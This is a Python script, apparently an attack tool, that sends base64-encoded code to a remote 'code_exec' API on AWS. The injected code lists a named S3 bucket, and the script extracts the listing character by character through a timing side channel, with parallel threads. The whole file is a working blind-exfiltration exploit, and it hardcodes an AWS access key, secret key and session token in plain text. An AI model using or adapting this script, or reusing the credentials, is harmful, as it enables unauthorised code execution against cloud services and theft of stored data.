import requests
import json
import base64
import time
import threading
import queue
from aws_requests_auth.aws_auth import AWSRequestsAuth
import urllib3
urllib3.disable_warnings()

auth = AWSRequestsAuth(
    aws_access_key='ASIARYWSMSYIMUKEC2H2', 
    aws_secret_access_key='JFnOdxBadPBwKxxU4FzigJGyaj5xrHdK6QFf87UY', 
    aws_token='IQoJb3JpZ2luX2VjELv//////////wEaDGlsLWNlbnRyYWwtMSJHMEUCIQCLiGMw3BqogcICvfzUkLQQQ+gf+qu0RIhAgb2JcCeR9AIgSj2+1ZnJTvhY6fiUV9tUea9HfnvRbU9khhCm1GdcQ50qtQIIJxAAGgwxMjE3NzQwNTI4ODAiDMi4hrw4JFCbWDcYZCqSAn/9Kfqd900GwhHd0D7k9yb2KkzXCkvzp1nxH7qSjmDDBzO+z1bE2u8NCZ71583LCsSXdpFOmjWc8KlMnJJlxXM+rXZk/pTzFw8LvI6tpT8YG6aYsZ9OHJj2RbZxe6EdkqxH/U997nvXvYUiaInCBYYAbJUv+jJCscA8w3Mqp9E1ZMUFqaBL7BzgU2Rr4OC2Ya9IFqc9EGQOctasd2pnQlqZzLZ3xkYRZaq/uZp4UI0cLeeSrAOc2c5e/nyBwGnjXGOWPjCQrt7lPfpyTfvz1WtK7s/rQnZJR+kcLV/QeWCbrZP94Ww92aQe1V39yQKG5j0b+/CDfnWsdaz1UWdyVyoGCzfBYf9vFT++2Bgsgy9s9howy43N0wY6nQG7mWxDY2csJ+zTrVcRxLXjepN/HjC8DkBemCDHgW/bV6pFk2NDjMR9z1YICfk+DBlieMr2+MYifcRF9qYVcj8OcL1GBUtpeceSZpWUS277vJxdq3D8pBSVsGejYcBg5EDBNwDdjK9/wAdwrRf5n3MWnPrb12rDuWY+zytkdRguq8ggCsouiXLpp+315K7x6CihxCFX8+BQG3cMgY+p', 
    aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com', 
    aws_region='us-east-1', 
    aws_service='execute-api'
)

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def check_bit(pos, bit):
    code = f"""
import os, time, boto3
try:
    s3 = boto3.client('s3', region_name='us-east-1')
    resp = s3.list_objects_v2(Bucket='userd8a2f72fe43094e8')
    val = str([item['Key'] for item in resp.get('Contents', [])])
except Exception as e:
    val = type(e).__name__ + ':' + str(e)

if len(val) > {pos} and (ord(val[{pos}]) & {bit}):
    time.sleep(2.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(URL, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    return (time.time() - start) > 1.5

def extract_pos(pos):
    char_code = 0
    for bit in [1, 2, 4, 8, 16, 32, 64]:
        if check_bit(pos, bit):
            char_code |= bit
    return chr(char_code) if char_code > 0 else ""

def thread_worker(pos, q):
    c = extract_pos(pos)
    q.put((pos, c))

def get_ex():
    print("Extracting S3 list...", flush=True)
    length = 200
    res = [""] * length
    
    for chunk_start in range(0, length, 20):
        chunk_end = min(length, chunk_start + 20)
        threads = []
        queues = []
        for pos in range(chunk_start, chunk_end):
            q = queue.Queue()
            t = threading.Thread(target=thread_worker, args=(pos, q))
            t.start()
            threads.append(t)
            queues.append(q)
        for i, t in enumerate(threads):
            t.join()
            pos, c = queues[i].get()
            res[pos] = c
        curr = "".join(res[:chunk_end])
        print(f"Progress: {curr}", flush=True)
        if curr.endswith("]") or curr.endswith("}"): 
            break
    return "".join(res)

print("RESULT:", get_ex(), flush=True)
